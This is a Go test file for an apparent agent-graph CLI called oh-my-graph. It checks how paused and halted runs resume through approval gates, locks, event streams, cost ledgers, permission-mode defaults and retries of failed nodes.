package main

import (
	"context"
	"encoding/json"
	"errors"
	"net/http"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/jitokim/oh-my-graph/internal/browser"
	"github.com/jitokim/oh-my-graph/internal/coordinator"
	"github.com/jitokim/oh-my-graph/internal/graph"
	"github.com/jitokim/oh-my-graph/internal/runfeed"
	"github.com/jitokim/oh-my-graph/internal/runner"
	"github.com/jitokim/oh-my-graph/internal/runstate"
	"github.com/jitokim/oh-my-graph/internal/schedule"
)

// pausedGateFlowRun executes the standard a -> approve(gate) -> ship graph
// against a fresh capturingRunner and returns once it has paused at the gate,
// so a resume test can start from a known, on-disk snapshot. Callers must
// isolateRunHome first — executeGraph writes its run directory under
// $OMG_HOME, which must never be the real home in a test.
func pausedGateFlowRun(t *testing.T) (runID string, rec *capturingRunner) {
	t.Helper()
	g := mustParse(t, `{"name":"gate-flow","nodes":[
		{"id":"a","prompt":"a"},
		{"id":"approve","type":"gate","depends_on":["a"]},
		{"id":"ship","prompt":"ship","depends_on":["approve"]}]}`)
	rec = &capturingRunner{}
	runID = "run-1"
	// rawSource is deliberately not valid JSON, forcing executeGraph onto the
	// json.Marshal(g) path a real `run` (hand-written YAML) takes — the
	// round-trip this whole feature depends on (internal/graph's json tags).
	err := executeGraph(context.Background(), runID, g, rec, commonRunFlags{inputs: inputFlag{}}, nil, 0, "gate-flow.yaml", []byte("name: gate-flow\n"), false, nil, nil, nil)
	var paused *schedule.PausedError
	if !errors.As(err, &paused) {
		t.Fatalf("expected the initial run to pause, got %T: %v", err, err)
	}
	if paused.GateID != "approve" {
		t.Fatalf("paused at %q, want approve", paused.GateID)
	}
	if rec.invocationFor("ship").Prompt != "" {
		t.Fatal("ship must not run before the gate is decided")
	}
	return runID, rec
}

func parseResumeFlags(t *testing.T, args []string) *resumeFlags {
	t.Helper()
	f := newResumeFlags()
	if err := f.parse(args); err != nil {
		t.Fatalf("parse resume flags %v: %v", args, err)
	}
	return f
}

// --- approve continues the run to completion ---------------------------------

func TestResume_ApprovedGateContinuesToCompletion(t *testing.T) {
	isolateRunHome(t)
	runID, rec := pausedGateFlowRun(t)

	err := executeResume(parseResumeFlags(t, []string{runID, "--approve", "approve"}), rec, nil)
	if err != nil {
		t.Fatalf("executeResume returned error: %v", err)
	}
	if rec.invocationFor("ship").Prompt == "" {
		t.Fatal("ship should have run once the gate was approved")
	}
}

func TestResume_PreservesPlanningAccountingInLedgerAndSnapshot(t *testing.T) {
	isolateRunHome(t)
	runID, rec := pausedGateFlowRun(t)
	statePath := filepath.Join(runDirFor(runID), stateFileName)
	snap, err := runstate.Load(statePath)
	if err != nil {
		t.Fatalf("load paused snapshot: %v", err)
	}
	snap.PlanningCostUSD = 0.25
	snap.PlanningCostUnknown = true
	snap.PlanningUsage = runstate.TokenUsage{InputTokens: 13, CachedInputTokens: 3, OutputTokens: 5, ReasoningOutputTokens: 2}
	if err := runstate.Write(statePath, snap); err != nil {
		t.Fatalf("seed planning accounting: %v", err)
	}

	var resumeErr error
	out := captureStdout(t, func() {
		resumeErr = executeResume(parseResumeFlags(t, []string{runID, "--approve", "approve"}), rec, nil)
	})
	if resumeErr != nil {
		t.Fatalf("executeResume returned error: %v", resumeErr)
	}
	if !strings.Contains(out, "PLANNING COST: $0.2500") || !strings.Contains(out, "TOTAL COST: unknown") {
		t.Fatalf("resumed ledger dropped planning cost accounting:\n%s", out)
	}
	if !strings.Contains(out, "TOKEN USAGE: input 13, cached 3, output 5, reasoning 2") {
		t.Fatalf("resumed ledger dropped planning token usage:\n%s", out)
	}

	resumed, err := runstate.Load(statePath)
	if err != nil {
		t.Fatalf("load resumed snapshot: %v", err)
	}
	if resumed.PlanningCostUSD != snap.PlanningCostUSD || resumed.PlanningCostUnknown != snap.PlanningCostUnknown || resumed.PlanningUsage != snap.PlanningUsage {
		t.Fatalf("resumed snapshot planning accounting = cost %v unknown %v usage %+v, want cost %v unknown %v usage %+v",
			resumed.PlanningCostUSD, resumed.PlanningCostUnknown, resumed.PlanningUsage,
			snap.PlanningCostUSD, snap.PlanningCostUnknown, snap.PlanningUsage)
	}
}

// --- reject prunes the subtree and is reported as a failure, not a crash ----

func TestResume_RejectedGatePrunesSubtree(t *testing.T) {
	isolateRunHome(t)
	runID, rec := pausedGateFlowRun(t)

	err := executeResume(parseResumeFlags(t, []string{runID, "--reject", "approve"}), rec, nil)
	var runFailed *schedule.RunFailedError
	if !errors.As(err, &runFailed) {
		t.Fatalf("expected *RunFailedError, got %T: %v", err, err)
	}
	if rec.invocationFor("ship").Prompt != "" {
		t.Fatal("ship must never run after the gate was rejected")
	}
}

// --- CLI contract: exactly one of --approve/--reject, gate id must match ----

func TestResume_BareInvocationNamesThePendingGate(t *testing.T) {
	isolateRunHome(t)
	runID, rec := pausedGateFlowRun(t)

	err := executeResume(parseResumeFlags(t, []string{runID}), rec, nil)
	if err == nil {
		t.Fatal("a bare resume on a paused run must be an error")
	}
	if !strings.Contains(err.Error(), "approve") {
		t.Fatalf("error should name the pending gate: %v", err)
	}
	if rec.invocationFor("ship").Prompt != "" {
		t.Fatal("a bare resume must never silently approve the gate")
	}
}

func TestResume_MismatchedGateNameIsRejected(t *testing.T) {
	isolateRunHome(t)
	runID, rec := pausedGateFlowRun(t)

	err := executeResume(parseResumeFlags(t, []string{runID, "--approve", "some-other-gate"}), rec, nil)
	if err == nil {
		t.Fatal("resuming a gate the run is not paused at must be an error")
	}
	if !strings.Contains(err.Error(), "some-other-gate") || !strings.Contains(err.Error(), "approve") {
		t.Fatalf("error should name both the requested and the actual gate: %v", err)
	}
}

func TestResume_BothApproveAndRejectIsRejected(t *testing.T) {
	isolateRunHome(t)
	runID, rec := pausedGateFlowRun(t)

	err := executeResume(parseResumeFlags(t, []string{runID, "--approve", "approve", "--reject", "approve"}), rec, nil)
	if err == nil {
		t.Fatal("--approve and --reject together must be rejected")
	}
}

// --- resuming a run that never paused ----------------------------------------

func TestResume_RunNotPausedErrors(t *testing.T) {
	isolateRunHome(t)
	g := mustParse(t, `{"name":"no-gate","nodes":[{"id":"a","prompt":"a"}]}`)
	rec := &capturingRunner{}
	runID := "run-complete"
	if err := executeGraph(context.Background(), runID, g, rec, commonRunFlags{inputs: inputFlag{}}, nil, 0, "no-gate.yaml", []byte("name: no-gate\n"), false, nil, nil, nil); err != nil {
		t.Fatalf("initial run should complete cleanly: %v", err)
	}

	err := executeResume(parseResumeFlags(t, []string{runID, "--approve", "whatever"}), rec, nil)
	if err == nil || !strings.Contains(err.Error(), "not paused") {
		t.Fatalf("expected a 'not paused' error, got %v", err)
	}
}

// --- resume.lock guards against a concurrent resume --------------------------

func TestResume_LockPreventsConcurrentResume(t *testing.T) {
	isolateRunHome(t)
	runID, rec := pausedGateFlowRun(t)

	lockPath := filepath.Join(runDirFor(runID), lockFileName)
	release, err := runstate.AcquireLock(lockPath)
	if err != nil {
		t.Fatalf("acquire lock ahead of the test's resume: %v", err)
	}
	defer release()

	err = executeResume(parseResumeFlags(t, []string{runID, "--approve", "approve"}), rec, nil)
	var held *runstate.LockHeldError
	if !errors.As(err, &held) {
		t.Fatalf("expected *runstate.LockHeldError while the lock is held, got %T: %v", err, err)
	}
	if rec.invocationFor("ship").Prompt != "" {
		t.Fatal("a lock-blocked resume must never have run any node")
	}
}

// TestResume_LockIsReleasedAfterAResume checks what "released" means under
// ADR 0015: the lock is given back, but the FILE stays. It must not be
// unlinked — acquiring is open-then-flock, and an unlink between those two
// steps lets one leg hold the lock on an orphaned inode while another takes it
// uncontended on a fresh one. So the evidence of a release is that the lock
// reads free and the next leg can take it, never that the file is gone.
func TestResume_LockIsReleasedAfterAResume(t *testing.T) {
	isolateRunHome(t)
	runID, rec := pausedGateFlowRun(t)

	if err := executeResume(parseResumeFlags(t, []string{runID, "--approve", "approve"}), rec, nil); err != nil {
		t.Fatalf("executeResume returned error: %v", err)
	}

	lockPath := filepath.Join(runDirFor(runID), lockFileName)
	if _, err := os.Stat(lockPath); err != nil {
		t.Fatalf("a released resume.lock must remain on disk as an inert handle: %v", err)
	}
	requireLiveness(t, runstate.ProbeLock(lockPath), runstate.LivenessFree)
	release, err := runstate.AcquireLock(lockPath)
	if err != nil {
		t.Fatalf("the next leg must be able to take the released lock: %v", err)
	}
	if err := release(); err != nil {
		t.Fatalf("release: %v", err)
	}
}

// --- multiple gates require multiple resumes ---------------------------------

// TestResume_MultipleGatesRequireMultipleResumes proves the shape DESIGN.md
// describes: "Multiple gates => multiple resumes: a resumed run advances to
// the next gate and pauses again."
func TestResume_MultipleGatesRequireMultipleResumes(t *testing.T) {
	isolateRunHome(t)
	g := mustParse(t, `{"name":"multi-gate","nodes":[
		{"id":"a","prompt":"a"},
		{"id":"gate1","type":"gate","depends_on":["a"]},
		{"id":"b","prompt":"b","depends_on":["gate1"]},
		{"id":"gate2","type":"gate","depends_on":["b"]},
		{"id":"c","prompt":"c","depends_on":["gate2"]}]}`)
	rec := &capturingRunner{}
	runID := "run-multi"

	err := executeGraph(context.Background(), runID, g, rec, commonRunFlags{inputs: inputFlag{}}, nil, 0, "multi.yaml", []byte("name: multi-gate\n"), false, nil, nil, nil)
	var paused *schedule.PausedError
	if !errors.As(err, &paused) || paused.GateID != "gate1" {
		t.Fatalf("expected the initial run to pause at gate1, got %T: %v", err, err)
	}

	err = executeResume(parseResumeFlags(t, []string{runID, "--approve", "gate1"}), rec, nil)
	if !errors.As(err, &paused) || paused.GateID != "gate2" {
		t.Fatalf("expected the first resume to pause at gate2, got %T: %v", err, err)
	}
	if rec.invocationFor("c").Prompt != "" {
		t.Fatal("c must not run before gate2 is decided")
	}

	if err := executeResume(parseResumeFlags(t, []string{runID, "--approve", "gate2"}), rec, nil); err != nil {
		t.Fatalf("the final resume returned error: %v", err)
	}
	if rec.invocationFor("c").Prompt == "" {
		t.Fatal("c should have run once gate2 was approved")
	}
}

// --- gate events reach the run's events.jsonl across legs --------------------

// readRunEvents decodes every line of the run's events.jsonl.
func readRunEvents(t *testing.T, runID string) []runfeed.Event {
	t.Helper()
	data, err := os.ReadFile(filepath.Join(runDirFor(runID), runfeed.FileName))
	if err != nil {
		t.Fatalf("read event stream: %v", err)
	}
	var events []runfeed.Event
	for i, line := range strings.Split(string(data), "\n") {
		if line == "" {
			continue
		}
		var e runfeed.Event
		if err := json.Unmarshal([]byte(line), &e); err != nil {
			t.Fatalf("line %d is not valid JSON: %v (%q)", i, err, line)
		}
		events = append(events, e)
	}
	return events
}

// eventSeen reports whether events contains one of type eventType for nodeID.
func eventSeen(events []runfeed.Event, eventType runfeed.EventType, nodeID string) bool {
	for _, e := range events {
		if e.Type == eventType && e.NodeID == nodeID {
			return true
		}
	}
	return false
}

// TestResume_GateEventsAppearInStream pins the gate-event wiring end to end:
// the first leg's pause lands a gate_paused in the run directory's
// events.jsonl, and the resumed leg's --approve lands a gate_approved in the
// SAME stream — both emitted by the scheduler through the EventSink
// executeGraph/executeResume inject, never by resume-side lifecycle logic.
func TestResume_GateEventsAppearInStream(t *testing.T) {
	isolateRunHome(t)
	runID, rec := pausedGateFlowRun(t)

	events := readRunEvents(t, runID)
	if !eventSeen(events, runfeed.EventGatePaused, "approve") {
		t.Fatalf("first leg did not emit gate_paused for the gate; events = %+v", events)
	}
	if eventSeen(events, runfeed.EventGateApproved, "approve") || eventSeen(events, runfeed.EventGateRejected, "approve") {
		t.Fatal("no approve/reject decision exists yet; the first leg must not emit one")
	}

	if err := executeResume(parseResumeFlags(t, []string{runID, "--approve", "approve"}), rec, nil); err != nil {
		t.Fatalf("executeResume returned error: %v", err)
	}
	if !eventSeen(readRunEvents(t, runID), runfeed.EventGateApproved, "approve") {
		t.Fatal("resumed leg did not emit gate_approved for the approved gate")
	}
}

// TestResume_GateRejectEventAppearsInStream is the reject half of the same
// wiring: a resumed leg replaying --reject lands a gate_rejected in the run's
// stream alongside the gate's terminal node_failed.
func TestResume_GateRejectEventAppearsInStream(t *testing.T) {
	isolateRunHome(t)
	runID, rec := pausedGateFlowRun(t)

	err := executeResume(parseResumeFlags(t, []string{runID, "--reject", "approve"}), rec, nil)
	var runFailed *schedule.RunFailedError
	if !errors.As(err, &runFailed) {
		t.Fatalf("expected *RunFailedError, got %T: %v", err, err)
	}
	if !eventSeen(readRunEvents(t, runID), runfeed.EventGateRejected, "approve") {
		t.Fatal("resumed leg did not emit gate_rejected for the rejected gate")
	}
}

// --- GraphSHA256 drift warning -----------------------------------------------

// TestResume_WarnsWhenGraphSourceFileChanged proves the advisory-only check
// DESIGN.md assigns to GraphSHA256: it neither blocks the resume nor changes
// what runs (the snapshot's own Graph bytes are still what executes), it just
// tells the user their on-disk file no longer matches what was snapshotted.
func TestResume_WarnsWhenGraphSourceFileChanged(t *testing.T) {
	isolateRunHome(t)
	// The snapshot's relative GraphSourcePath still resolves against the
	// process cwd, so this test keeps its chdir for the graph file itself.
	dir := t.TempDir()
	t.Chdir(dir)
	runID, rec := pausedGateFlowRun(t)

	// pausedGateFlowRun snapshots GraphSourcePath "gate-flow.yaml", which does
	// not exist on disk in this temp dir. Create it now with content that
	// deliberately does not hash to the snapshot's GraphSHA256 (computed over
	// the literal bytes []byte("name: gate-flow\n") passed at snapshot time).
	if err := os.WriteFile(filepath.Join(dir, "gate-flow.yaml"), []byte("name: gate-flow-edited\n"), 0o644); err != nil {
		t.Fatalf("write edited graph file: %v", err)
	}

	stderr, resumeErr := captureStderr(t, func() error {
		return executeResume(parseResumeFlags(t, []string{runID, "--approve", "approve"}), rec, nil)
	})

	if resumeErr != nil {
		t.Fatalf("executeResume returned error: %v", resumeErr)
	}
	if !strings.Contains(stderr, "gate-flow.yaml") || !strings.Contains(stderr, "changed on disk") {
		t.Errorf("expected a stderr warning about the changed graph source, got %q", stderr)
	}
}

// captureStderr runs fn with os.Stderr redirected to a pipe and returns
// everything it wrote, alongside fn's own error. Process-global stderr rather
// than an injected writer because the warnings under test print to os.Stderr
// directly. It mutates the process-global os.Stderr, which is why cmd tests
// must never call t.Parallel.
func captureStderr(t *testing.T, fn func() error) (string, error) {
	t.Helper()
	origStderr := os.Stderr
	r, w, err := os.Pipe()
	if err != nil {
		t.Fatalf("os.Pipe: %v", err)
	}
	os.Stderr = w
	done := make(chan string, 1)
	go func() {
		var buf strings.Builder
		chunk := make([]byte, 4096)
		for {
			n, readErr := r.Read(chunk)
			if n > 0 {
				buf.Write(chunk[:n])
			}
			if readErr != nil {
				break
			}
		}
		done <- buf.String()
	}()

	fnErr := fn()

	os.Stderr = origStderr
	_ = w.Close()
	stderr := <-done
	_ = r.Close()
	return stderr, fnErr
}

// --- resumed legs re-warn for bypassPermissions ------------------------------

// TestResume_WarnsOnBypassPermissions pins DESIGN.md's "loud warning, never
// silently" promise onto the resume path: a paused run whose graph opted a
// node into bypassPermissions must warn again when it is resumed, not only
// when it was first loaded — the resume may happen in a different terminal
// session, long after the original warning scrolled away.
func TestResume_WarnsOnBypassPermissions(t *testing.T) {
	isolateRunHome(t)
	g := mustParse(t, `{"name":"bypass-flow","nodes":[
		{"id":"a","prompt":"a"},
		{"id":"approve","type":"gate","depends_on":["a"]},
		{"id":"ship","prompt":"ship","depends_on":["approve"],"permission_mode":"bypassPermissions"}]}`)
	rec := &capturingRunner{}
	runID := "run-bypass"
	err := executeGraph(context.Background(), runID, g, rec, commonRunFlags{inputs: inputFlag{}}, nil, 0, "bypass-flow.yaml", []byte("name: bypass-flow\n"), false, nil, nil, nil)
	var paused *schedule.PausedError
	if !errors.As(err, &paused) {
		t.Fatalf("expected the initial run to pause, got %T: %v", err, err)
	}

	stderr, resumeErr := captureStderr(t, func() error {
		return executeResume(parseResumeFlags(t, []string{runID, "--approve", "approve"}), rec, nil)
	})

	if resumeErr != nil {
		t.Fatalf("executeResume returned error: %v", resumeErr)
	}
	if !strings.Contains(stderr, "bypassPermissions") || !strings.Contains(stderr, `"ship"`) {
		t.Errorf("expected a stderr warning naming the bypassPermissions node, got %q", stderr)
	}
}

// --- a resumed leg keeps the default its first leg ran under -----------------

// TestResume_SnapshotWithoutDefaultPermissionModeStaysDontAsk is the upgrade
// case for the permission-mode default. A snapshot has never recorded the
// RESOLVED mode of a node — an undeclared permission_mode is absent from the
// graph JSON too (internal/graph, Node.PermissionMode is omitempty) — so
// nothing in a pre-flip state.json says which mode its nodes actually ran
// under. Without the recorded default, a run that paused at a gate under
// `dontAsk` would finish under `auto` the moment a newer binary resumed it:
// same run, two permission regimes, no warning and nothing to detect it with.
//
// Both halves are pinned here because either alone would pass while the run
// still changed mode mid-flight: a launch that records its default, and a
// resume that reads an ABSENT one as dontAsk rather than as "unset, use mine".
func TestResume_SnapshotWithoutDefaultPermissionModeStaysDontAsk(t *testing.T) {
	isolateRunHome(t)
	runID, _ := pausedGateFlowRun(t)
	statePath := filepath.Join(runDirFor(runID), stateFileName)

	snap, err := runstate.Load(statePath)
	if err != nil {
		t.Fatalf("load snapshot: %v", err)
	}
	if snap.DefaultPermissionMode != schedule.DefaultPermissionMode {
		t.Fatalf("a run launched now recorded default %q, want %q — its own later legs have nothing to hold onto",
			snap.DefaultPermissionMode, schedule.DefaultPermissionMode)
	}

	// Age the snapshot into one an older binary wrote. The key is omitempty, so
	// clearing the field removes it from the file outright — the same bytes a
	// pre-flip binary produced, not an approximation of them.
	snap.DefaultPermissionMode = ""
	if err := runstate.Write(statePath, snap); err != nil {
		t.Fatalf("write aged snapshot: %v", err)
	}
	raw, err := os.ReadFile(statePath)
	if err != nil {
		t.Fatalf("read aged snapshot: %v", err)
	}
	if strings.Contains(string(raw), "default_permission_mode") {
		t.Fatalf("the aged snapshot still names a default, so this test proves nothing:\n%s", raw)
	}

	rec := &capturingRunner{}
	if err := executeResume(parseResumeFlags(t, []string{runID, "--approve", "approve"}), rec, nil); err != nil {
		t.Fatalf("executeResume: %v", err)
	}
	if got := rec.invocationFor("ship").PermissionMode; got != graph.PermissionDontAsk {
		t.Errorf("a node resumed from a pre-auto snapshot ran as %q, want %q", got, graph.PermissionDontAsk)
	}

	// The resumed leg writes the resolved answer back, so a run is only ever
	// ambiguous on the first leg after the upgrade — and a third leg reads an
	// answer instead of inferring one.
	after, err := runstate.Load(statePath)
	if err != nil {
		t.Fatalf("reload snapshot: %v", err)
	}
	if after.DefaultPermissionMode != graph.PermissionDontAsk {
		t.Errorf("the resumed leg recorded default %q, want %q", after.DefaultPermissionMode, graph.PermissionDontAsk)
	}
}

// --- exit code mapping (ADR 0003: 0 pass, 1 fail, 2 paused) ------------------

func TestMainExitCode_PauseMapsToExitCode2(t *testing.T) {
	isolateRunHome(t)
	dir := t.TempDir()
	graphPath := filepath.Join(dir, "gate-only.yaml")
	// A graph whose only node is a root gate never touches the NodeRunner, so
	// this drives the real `run` subcommand (and its real CLIRunner)
	// end to end without spawning a claude subprocess.
	if err := os.WriteFile(graphPath, []byte("name: gate-only\nnodes:\n  - { id: approve, type: gate }\n"), 0o644); err != nil {
		t.Fatalf("write graph file: %v", err)
	}

	if code := mainExitCode([]string{"run", graphPath}); code != 2 {
		t.Fatalf("exit code = %d, want 2 for a paused run", code)
	}
}

func TestMainExitCode_MissingGraphFileMapsToExitCode1(t *testing.T) {
	if code := mainExitCode([]string{"run", "/no/such/file.yaml"}); code != 1 {
		t.Fatalf("exit code = %d, want 1", code)
	}
}

func TestMainExitCode_UnknownCommandMapsToExitCode1(t *testing.T) {
	if code := mainExitCode([]string{"bogus"}); code != 1 {
		t.Fatalf("exit code = %d, want 1", code)
	}
}

// TestMainExitCode_ResumeMissingRunIDMapsToExitCode1 is the regression guard
// for the OTHER pre-existing error #200 must leave alone: a bare `resume`,
// with no positional at all, must still exit 1 on its unchanged "missing run
// id" message — the new help/flag guard only ever answers a help token or an
// unrecognised flag, never an empty argv.
func TestMainExitCode_ResumeMissingRunIDMapsToExitCode1(t *testing.T) {
	if code := mainExitCode([]string{"resume"}); code != 1 {
		t.Fatalf("bare `resume` must exit 1, got %d", code)
	}
}

// TestResumeFlags_ValidDashFreeRunIDStillReachesTheLoadPath is the
// regression guard the other way: a run id that does not begin with "-"
// still parses into f.runID exactly as before, so runResumeRuntime still
// carries it all the way to persistedNodeRunner's runstate.Load — the same
// "load run" failure a nonexistent run id produced before the fix.
func TestResumeFlags_ValidDashFreeRunIDStillReachesTheLoadPath(t *testing.T) {
	isolateRunHome(t)
	err := runResumeRuntime(runner.RuntimeClaude, false, []string{"run-1"})
	if err == nil || !strings.Contains(err.Error(), `load run "run-1"`) {
		t.Fatalf("err = %v, want the unchanged load-run failure for a dash-free id", err)
	}
	var usage *usageRequest
	if errors.As(err, &usage) {
		t.Errorf("a valid run id must not be answered as help: %v", err)
	}
}

func TestMainExitCode_VersionMapsToExitCode0(t *testing.T) {
	if code := mainExitCode([]string{"version"}); code != 0 {
		t.Fatalf("exit code = %d, want 0", code)
	}
}

// --- continue-on-fail: a settled-failed node never re-runs or double-records ---

// scriptedRunner is capturingRunner's sibling for a test that needs one
// specific node to fail: it records how many times each prompt was invoked —
// so a test can prove a node was launched exactly once across BOTH legs, not
// merely that it was launched at all — and returns a scripted FAIL outcome
// (nonzero exit, carrying a cost) for any prompt named in failing, PASS for
// everything else. failFirst scripts a transient failure instead: only the
// prompt's FIRST invocation fails, so a --retry-failed leg can prove the
// second attempt succeeds.
type scriptedRunner struct {
	mu          sync.Mutex
	invocations map[string]int
	failing     map[string]float64 // prompt -> cost the failing attempt reports
	failFirst   map[string]float64 // prompt -> cost; fails the first invocation only
}

func (r *scriptedRunner) Run(_ context.Context, spec runner.NodeInvocation) (runner.NodeOutcome, error) {
	r.mu.Lock()
	defer r.mu.Unlock()
	if r.invocations == nil {
		r.invocations = make(map[string]int)
	}
	prompt := nodePromptOf(spec.Prompt)
	r.invocations[prompt]++
	cost, fails := r.failing[prompt]
	if !fails && r.invocations[prompt] == 1 {
		cost, fails = r.failFirst[prompt]
	}
	if fails {
		return runner.NodeOutcome{SessionID: "s-" + prompt, Result: "FAIL", ExitCode: 1, TotalCostUSD: cost}, nil
	}
	return runner.NodeOutcome{SessionID: "s-" + prompt, Result: "PASS", ExitCode: 0}, nil
}

// nodePromptOf recovers a node's OWN prompt from an invocation, dropping the
// quote of a previous attempt a retry appends to it (ADR 0020). A fixture that
// keys a node by its prompt has to cut there or a re-executed node looks like a
// node it has never seen — which is exactly how it fails: not "the retry ran
// with the wrong prompt", but "the retry never ran".
func nodePromptOf(prompt string) string {
	return strings.SplitN(prompt, schedule.RetryQuoteHeader, 2)[0]
}

func (r *scriptedRunner) invocationCount(prompt string) int {
	r.mu.Lock()
	defer r.mu.Unlock()
	return r.invocations[prompt]
}

// promptsContaining returns every recorded prompt containing substr — the
// lookup a test needs for a node whose final prompt is interpolated at run
// time (it embeds an artifact path the test cannot know up front).
func (r *scriptedRunner) promptsContaining(substr string) []string {
	r.mu.Lock()
	defer r.mu.Unlock()
	var out []string
	for prompt := range r.invocations {
		if strings.Contains(prompt, substr) {
			out = append(out, prompt)
		}
	}
	return out
}

// TestResume_ContinueOnFail_SettledFailedNodeDoesNotRerunOrDoubleRecord is the
// failure-first regression test for the bug deep review found: under
// --continue-on-fail, a node that FAILED on leg 1 was absent from
// Snapshot.CompletedNodes (pass-only by design), so `resume` handed it right
// back to graph.ReadyGiven as ready and it RE-EXECUTED — and because
// executeResume also pre-seeds the ledger from every snap.Nodes entry
// (including the FAIL), the re-run added a SECOND ledger row for the same
// node, double-counting its cost in TOTAL COST.
//
// The graph pairs an independent gate (so this run is legitimately resumable
// at all) with a sibling branch where "flaky" fails and "orphan" — flaky's
// only dependent — must never run, on either leg.
func TestResume_ContinueOnFail_SettledFailedNodeDoesNotRerunOrDoubleRecord(t *testing.T) {
	isolateRunHome(t)
	g := mustParse(t, `{"name":"gate-continue","nodes":[
		{"id":"gate","type":"gate"},
		{"id":"flaky","prompt":"flaky"},
		{"id":"orphan","prompt":"orphan","depends_on":["flaky"]},
		{"id":"ship","prompt":"ship","depends_on":["gate"]}]}`)
	rec := &scriptedRunner{failing: map[string]float64{"flaky": 0.05}}
	runID := "run-continue"

	err := executeGraph(context.Background(), runID, g, rec,
		commonRunFlags{inputs: inputFlag{}, continueOnFail: true},
		nil, 0, "gate-continue.yaml", []byte("name: gate-continue\n"), false, nil, nil, nil)
	var paused *schedule.PausedError
	if !errors.As(err, &paused) || paused.GateID != "gate" {
		t.Fatalf("expected the initial run to pause at gate, got %T: %v", err, err)
	}
	if got := rec.invocationCount("flaky"); got != 1 {
		t.Fatalf("flaky invocation count after leg 1 = %d, want 1", got)
	}
	if got := rec.invocationCount("orphan"); got != 0 {
		t.Fatalf("orphan (flaky's dependent) invocation count after leg 1 = %d, want 0 — its subtree is pruned", got)
	}

	var resumeErr error
	out := captureStdout(t, func() {
		resumeErr = executeResume(parseResumeFlags(t, []string{runID, "--approve", "gate"}), rec, nil)
	})
	if resumeErr != nil {
		t.Fatalf("executeResume returned error: %v", resumeErr)
	}

	if got := rec.invocationCount("flaky"); got != 1 {
		t.Fatalf("flaky invocation count after resume = %d, want still 1 — a settled-failed node must never re-run", got)
	}
	if got := rec.invocationCount("orphan"); got != 0 {
		t.Fatalf("orphan invocation count after resume = %d, want still 0 — its pruned subtree must stay pruned across the resume", got)
	}
	if got := rec.invocationCount("ship"); got != 1 {
		t.Fatalf("ship invocation count after resume = %d, want 1 — the approved gate's dependent should run", got)
	}

	if got, want := strings.Count(out, "\nflaky "), 1; got != want {
		t.Fatalf("resumed leg's ledger table shows %d row(s) for flaky, want exactly %d (no double-record):\n%s", got, want, out)
	}
	if !strings.Contains(out, "0.0500") {
		t.Fatalf("flaky's original $0.0500 cost must survive into the resumed leg's ledger, undoubled:\n%s", out)
	}
}

// --- resume --retry-failed: salvage a halted run ------------------------------

// haltedRetryFlowRun executes a -> flaky -> child under default halt-on-fail
// against a scriptedRunner whose "flaky" fails only its first attempt, and
// returns once the run has halted with the mix --retry-failed exists for:
// "a" PASSED, "flaky" FAILED, "child" cancelled (never launched, no record).
// child's prompt interpolates a's artifact, so a retry leg can prove a passed
// parent's artifact still reaches a retried child.
func haltedRetryFlowRun(t *testing.T) (runID string, rec *scriptedRunner) {
	t.Helper()
	g := mustParse(t, `{"name":"retry-flow","nodes":[
		{"id":"a","prompt":"a"},
		{"id":"flaky","prompt":"flaky","depends_on":["a"]},
		{"id":"child","prompt":"child reads {{ artifacts.a }}","depends_on":["flaky"]}]}`)
	rec = &scriptedRunner{failFirst: map[string]float64{"flaky": 0.05}}
	runID = "run-retry"

	err := executeGraph(context.Background(), runID, g, rec, commonRunFlags{inputs: inputFlag{}}, nil, 0, "retry-flow.yaml", []byte("name: retry-flow\n"), false, nil, nil, nil)
	var halted *schedule.HaltError
	if !errors.As(err, &halted) {
		t.Fatalf("expected the initial run to halt on flaky, got %T: %v", err, err)
	}
	if got := rec.invocationCount("a"); got != 1 {
		t.Fatalf("a invocation count after leg 1 = %d, want 1", got)
	}
	if got := rec.invocationCount("flaky"); got != 1 {
		t.Fatalf("flaky invocation count after leg 1 = %d, want 1", got)
	}
	if got := len(rec.promptsContaining("child")); got != 0 {
		t.Fatalf("child ran %d time(s) on leg 1, want 0 — the halt cancelled it before launch", got)
	}
	return runID, rec
}

// TestResume_RetryFailed_ReExecutesExactlyTheNonPassedSet is the feature's
// end-to-end story: after a default halt-on-fail run stops with a mix of
// passed/failed/cancelled nodes, `resume --retry-failed` re-executes exactly
// the non-passed set. "a" is never re-run (and never re-paid for), "flaky"
// runs a second time and passes, and "child" — cancelled on leg 1 — runs with
// a's artifact path interpolated into its prompt exactly as a gate resume
// would have handed it. The ledger shows one row per node and events.jsonl
// brackets the retry as its own leg.
func TestResume_RetryFailed_ReExecutesExactlyTheNonPassedSet(t *testing.T) {
	isolateRunHome(t)
	runID, rec := haltedRetryFlowRun(t)

	var resumeErr error
	out := captureStdout(t, func() {
		resumeErr = executeResume(parseResumeFlags(t, []string{runID, "--retry-failed"}), rec, nil)
	})
	if resumeErr != nil {
		t.Fatalf("executeResume --retry-failed returned error: %v", resumeErr)
	}

	if got := rec.invocationCount("a"); got != 1 {
		t.Fatalf("a invocation count after retry = %d, want still 1 — a passed node must never re-run", got)
	}
	if got := rec.invocationCount("flaky"); got != 2 {
		t.Fatalf("flaky invocation count after retry = %d, want 2 — the cleared failure re-executes", got)
	}
	childPrompts := rec.promptsContaining("child reads ")
	if len(childPrompts) != 1 {
		t.Fatalf("child ran %d time(s) after retry, want exactly 1 (prompts: %v)", len(childPrompts), childPrompts)
	}
	if !strings.Contains(childPrompts[0], "a.out") {
		t.Fatalf("child's prompt should interpolate the passed parent's artifact path, got %q", childPrompts[0])
	}

	if !strings.Contains(out, "retrying failed nodes: flaky") {
		t.Fatalf("retry banner should name the cleared node:\n%s", out)
	}
	for _, node := range []string{"\na ", "\nflaky ", "\nchild "} {
		if got := strings.Count(out, node); got != 1 {
			t.Fatalf("ledger shows %d row(s) for %q, want exactly 1:\n%s", got, strings.TrimSpace(node), out)
		}
	}

	events := readRunEvents(t, runID)
	if got := countEvents(events, runfeed.EventRunStarted, ""); got != 2 {
		t.Fatalf("events.jsonl holds %d run_started, want 2 — the retry is its own leg", got)
	}
	if !eventSeen(events, runfeed.EventNodeFailed, "flaky") || !eventSeen(events, runfeed.EventNodePassed, "flaky") {
		t.Fatalf("the stream should tell flaky's whole story (leg-1 node_failed, retry-leg node_passed); events = %+v", events)
	}
	if !eventSeen(events, runfeed.EventNodePassed, "child") {
		t.Fatal("the retried leg should have run child to a node_passed")
	}
}

// TestResume_RetryFailedConflictsWithGateFlags pins the mutual exclusion:
// retrying failures and deciding a gate are separate resumes, so combining
// the flags is a clear error before any state is touched.
